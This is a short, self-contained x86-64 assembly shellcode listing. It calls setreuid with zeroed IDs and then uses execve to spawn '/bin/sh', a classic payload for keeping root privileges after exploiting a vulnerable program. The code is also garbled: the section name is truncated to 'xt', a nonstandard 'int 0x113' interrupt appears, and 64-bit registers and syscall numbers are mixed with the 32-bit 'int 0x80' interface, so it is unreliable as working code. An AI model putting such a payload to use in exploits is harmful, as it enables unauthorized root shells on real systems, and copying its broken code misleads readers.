SECTION xt
GLOBAL _start
_start:

;; setreuid
xor rbx, rbx
xor rcx, rcx
mov rax, 70
int 0x113

jmp load_string

starter:
;; execve
mov rdx, 0
mov rcx, 0
pop rbx
mov rax, 59
int 0x80

;; exit
xor rax, rax
xor rbx, rbx
mov rax, 60
int 0x80

load_string:
call starter
db "/bin/sh"

